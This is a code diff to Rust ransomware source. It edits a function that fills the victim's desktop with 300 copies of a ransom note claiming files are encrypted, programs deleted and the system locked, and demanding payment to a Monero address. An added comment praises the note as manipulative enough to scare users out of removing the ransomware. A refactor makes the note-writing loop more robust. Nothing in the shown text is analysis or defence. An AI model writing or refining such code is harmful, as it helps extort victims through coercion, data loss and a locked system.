@@ -4,6 +4,8 @@ pub fn put_files_on_desktop_on_how_to_recover_data(
     monero_address: &str,
     money_amount_in_dollars: &str,
 ) {
+    // This is a sample that is quite manipulative in my opinion scaring the user from trying to remove the ransomware
+    // But of course it ain't perfect so you should check it and change it.
     let content = format!("All your important files (documents and folders on disk) have been encrypted =)) and the others like programs and games have been deleted.\n\
                         Your system has been locked down, so features like task mgr, run, regedit don't work anymore.\n\
                         If you reboot your computer the process will continue on the next boot and encrypt any new files\n\
@@ -24,13 +26,17 @@ pub fn put_files_on_desktop_on_how_to_recover_data(
     match dirs::desktop_dir() {
         Some(path) => {
             for i in 0..300 {
-                fs::write(
-                    path.to_str().unwrap().to_owned()
-                        + "\\OpenMeInNotepad"
-                        + i.to_string().as_str()
-                        + ".rustsw",
-                    &content,
-                );
+                let current_path = match path.to_str() {
+                    Some(path_str) => {
+                        path_str.to_owned()
+                            + "\\OpenMeInNotepad"
+                            + i.to_string().as_str()
+                            + ".rustsw"
+                    }
+                    None => return,
+                };
+
+                fs::write(current_path, &content);
             }
         }
         None => (),
